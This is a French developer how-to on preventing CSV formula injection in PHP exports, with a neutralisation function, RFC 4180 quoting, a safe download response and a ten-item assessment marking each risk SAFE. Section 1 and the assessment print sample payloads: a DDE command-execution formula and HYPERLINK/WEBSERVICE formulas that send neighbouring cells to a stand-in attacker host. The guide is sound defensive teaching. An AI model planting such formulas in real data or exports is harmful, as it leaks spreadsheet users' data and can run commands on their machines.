# How-to : Prévenir l'injection de formule CSV / tableur à l'export

Quand votre API exporte des données fournies par l'utilisateur en CSV, le danger n'est pas sur votre serveur — il est sur le **tableur du destinataire**. Excel, Google Sheets et LibreOffice traitent une cellule dont le texte commence par `=`, `+`, `-`, `@`, une tabulation (`\t`) ou un retour chariot (`\r`) comme une **formule**. Un attaquant qui parvient à introduire dans votre base de données une chaîne comme `=cmd|'/c calc'!A0` ou `=HYPERLINK("https://evil.example/?"&A1)` la fera exécuter (DDE) ou exfiltrer la ligne quand un administrateur ouvrira le fichier exporté.

C'est l'**injection CSV** (alias injection de formule). C'est un problème d'*encodage de sortie* à la frontière d'export — distinct de l'[injection SQL](sql-injection.md) (un problème de requête) et de l'[import CSV en masse](csv-bulk-import.md) (un problème d'entrée).

**Prérequis** : Vous avez un endpoint qui retourne des lignes en CSV.

---

## 1. L'attaque

Stockez ceci comme un « nom d'affichage » parfaitement valide, puis exportez la table en CSV et ouvrez-la dans Excel :

```
=HYPERLINK("https://evil.example/leak?d="&A1&A2, "Click for refund")
```

- `=...HYPERLINK...` — exfiltre les cellules voisines vers une URL attaquante au clic.
- `=WEBSERVICE("https://evil.example/?"&A1)` — exfiltre **sans aucun clic** dans les anciens Excel.
- `=cmd|'/c calc'!A0` — DDE ; peut exécuter une commande locale après une boîte de dialogue de confirmation.

Rien de tout cela ne touche votre serveur. Votre validation est passée, votre SQL était paramétré — et vous avez quand même livré un exploit fonctionnel à l'intérieur d'un CSV « valide ».

---

## 2. Le correctif : neutraliser le caractère initial

La base de référence recommandée par l'OWASP : si la valeur d'une cellule commence par un caractère dangereux **et n'est pas un simple nombre**, la préfixer d'une apostrophe simple (`'`). Excel rend alors la cellule comme du texte littéral.

```php
/**
 * Neutralize a value before writing it to a CSV cell so spreadsheet
 * software cannot interpret it as a formula.
 */
function neutralizeCsvCell(string $value): string
{
    if ($value === '') {
        return $value;
    }
    $dangerous = ['=', '+', '-', '@', "\t", "\r"];
    // Keep genuine numbers (incl. negatives like -50) intact; only quote
    // values that *start* dangerous and are not numeric.
    if (in_array($value[0], $dangerous, true) && !is_numeric($value)) {
        return "'" . $value;
    }

    return $value;
}
```

La garde `!is_numeric()` est la partie que la plupart des implémentations ratent : préfixer aveuglément chaque `-`/`+` transforme le nombre légitime `-50` en texte `'-50`, cassant les sommes dans la feuille du destinataire. Les nombres passent ; seules les chaînes en forme de formule sont mises entre apostrophes.

---

## 3. Combiner avec le quoting RFC 4180

La neutralisation gère les formules ; il vous faut quand même un quoting correct pour que les valeurs contenant des virgules, des guillemets ou des sauts de ligne ne cassent pas la structure des colonnes (un vecteur d'injection distinct). Laissez `fputcsv` le faire, avec `escape=""` pour un comportement [RFC 4180](https://www.rfc-editor.org/rfc/rfc4180) strict (pas d'échappement par antislash) :

```php
$fp = fopen('php://temp', 'r+');
foreach ($rows as $row) {
    fputcsv($fp, array_map('neutralizeCsvCell', $row), ',', '"', '');
}
rewind($fp);
$csv = stream_get_contents($fp);
```

Entrée → sortie (vérifié) :

```
=1+1                       → '=1+1
+budget                    → '+budget
@home                      → '@home
-50                        → -50            (real number, untouched)
=cmd|'/c calc'!A0          → "'=cmd|'/c calc'!A0"
a,b                        → "a,b"
he said "hi"               → "he said ""hi"""
```

> `escape=""` importe : le caractère d'échappement historique par défaut de PHP (`\`) produit une sortie qui **n'est pas** RFC 4180 et qu'Excel analyse mal. Passez toujours `""`.

---

## 4. La retourner comme réponse de téléchargement

Construisez la réponse PSR-7 dans le handler. Deux détails supplémentaires au niveau des en-têtes comptent :

```php
$filename = 'export-' . date('Ymd') . '.csv';

return $responseFactory->createResponse(200)
    ->withHeader('Content-Type', 'text/csv; charset=UTF-8')
    // Sanitize the filename: strip CR/LF/quotes so it cannot inject extra headers.
    ->withHeader('Content-Disposition', 'attachment; filename="'
        . preg_replace('/[\r\n"]/', '', $filename) . '"')
    ->withBody($streamFactory->createStream("\u{FEFF}" . $csv));
```

- **`Content-Disposition: attachment`** force un téléchargement au lieu de laisser le navigateur rendre les octets (défense contre le content sniffing).
- **assainissement du `filename`** — n'interpolez jamais un nom contrôlé par l'utilisateur sans supprimer `\r`, `\n` et `"` ; sinon il devient un vecteur d'injection d'en-tête.
- **BOM (`\u{FEFF}`)** — optionnel ; fait ouvrir correctement l'UTF-8 par Excel. Cela n'affecte pas la défense contre l'injection.

Gardez la neutralisation dans la couche d'export (un petit value object `CsvWriter`), et non dispersée dans les handlers — la même garantie couvre alors chaque endpoint d'export.

---

## Vulnerability Assessment

### V-01 — Injection de formule via `=` initial ✅ SAFE

**Risque** : Une valeur stockée comme `=1+1` ou `=HYPERLINK(...)` s'exécute à l'ouverture du CSV.
**Constat** : SAFE — `neutralizeCsvCell()` préfixe `'`, donc la cellule est rendue comme du texte (`'=1+1`).

---

### V-02 — Exécution de commande DDE (`=cmd|...`) ✅ SAFE

**Risque** : `=cmd|'/c calc'!A0` déclenche le DDE et peut exécuter une commande locale.
**Constat** : SAFE — le payload commence par `=` et n'est pas numérique, il est donc mis entre apostrophes (`"'=cmd|'/c calc'!A0"`).

---

### V-03 — Exfiltration de données via `WEBSERVICE`/`HYPERLINK` ✅ SAFE

**Risque** : `=WEBSERVICE("https://evil/?"&A1)` fait fuiter les cellules voisines, parfois sans clic.
**Constat** : SAFE — neutralisé de façon identique ; le `=` initial est désamorcé avant que le nom de la fonction ne soit atteint.

---

### V-04 — Déclencheurs `+`, `-`, `@` en tête ✅ SAFE

**Risque** : Excel évalue aussi les cellules commençant par `+`, `-` et `@`.
**Constat** : SAFE — tous les quatre sont dans l'ensemble `$dangerous` ; `+budget` → `'+budget`, `@home` → `'@home`.

---

### V-05 — Contournement par préfixe tabulation / retour chariot ✅ SAFE

**Risque** : Un `\t` ou `\r` initial est supprimé par certains parseurs, exposant un `=` en dessous (`\t=1+1`).
**Constat** : SAFE — `\t` et `\r` sont eux-mêmes dans l'ensemble `$dangerous`, donc toute la cellule est mise entre apostrophes avant tout retrait.

---

### V-06 — Rupture de colonne via virgule / guillemet / saut de ligne ✅ SAFE

**Risque** : Une valeur comme `a,b` ou un `"`/saut de ligne intégré décale les données dans les mauvaises colonnes (injection structurelle).
**Constat** : SAFE — `fputcsv(..., escape: '')` applique le quoting RFC 4180 (`"a,b"`, `"he said ""hi"""`).

---

### V-07 — Injection d'en-tête via le `filename` de `Content-Disposition` ✅ SAFE

**Risque** : Un nom d'export contrôlé par l'utilisateur contenant `\r\n` injecte des en-têtes de réponse supplémentaires.
**Constat** : SAFE — le filename passe par `preg_replace('/[\r\n"]/', '', ...)` avant d'être placé dans l'en-tête.

---

### V-08 — Content sniffing / rendu inline ✅ SAFE

**Risque** : Sans `attachment`, un navigateur peut rendre le CSV comme du HTML et exécuter le markup intégré.
**Constat** : SAFE — `Content-Type: text/csv` + `Content-Disposition: attachment` forcent un téléchargement.

---

### V-09 — Nombres négatifs légitimes corrompus ✅ SAFE (correction)

**Risque** : Une neutralisation trop zélée transforme `-50` en texte `'-50`, corrompant les sommes en aval.
**Constat** : SAFE — la garde `!is_numeric()` laisse passer intacts les nombres bien formés (`-50`, `+1`, `-5e3`).

---

### V-10 — Centralisation de la défense ✅ SAFE

**Risque** : La construction CSV ad hoc par handler laisse un endpoint oublier la neutralisation.
**Constat** : SAFE (par conception) — la neutralisation vit dans une couche d'export unique appliquée via `array_map`, donc chaque colonne de chaque export est couverte.

---

### VULN Summary

| ID | Vulnérabilité | Constat |
|----|---------------|---------|
| V-01 | Injection de formule (`=`) | ✅ SAFE |
| V-02 | Exécution de commande DDE | ✅ SAFE |
| V-03 | Exfiltration `WEBSERVICE`/`HYPERLINK` | ✅ SAFE |
| V-04 | Déclencheurs `+` / `-` / `@` | ✅ SAFE |
| V-05 | Contournement par préfixe tabulation / CR | ✅ SAFE |
| V-06 | Rupture de colonne virgule / guillemet / saut de ligne | ✅ SAFE |
| V-07 | Injection d'en-tête via filename | ✅ SAFE |
| V-08 | Content sniffing / rendu inline | ✅ SAFE |
| V-09 | Corruption des nombres négatifs | ✅ SAFE |
| V-10 | Centralisation de la défense | ✅ SAFE |

**10 SAFE, 0 EXPOSED.** Aucun constat critique. La règle de neutralisation du caractère initial (avec une garde numérique) plus le quoting RFC 4180 et une réponse de téléchargement `attachment` ferment la surface d'injection CSV. La seule réserve résiduelle est humaine : l'apostrophe `'` de neutralisation est visible comme une apostrophe initiale dans certains parseurs CSV non-tableur — acceptable, puisque l'alternative est l'exécution de code dans le tableur du destinataire.

---

## Guides associés

- [CSV bulk import](csv-bulk-import.md) — le côté entrée (succès partiel, détection des doublons)
- [Data export API](data-export-api.md) — flux d'export asynchrone protégé par token
- [SQL injection defense](sql-injection.md) — la classe d'injection côté requête
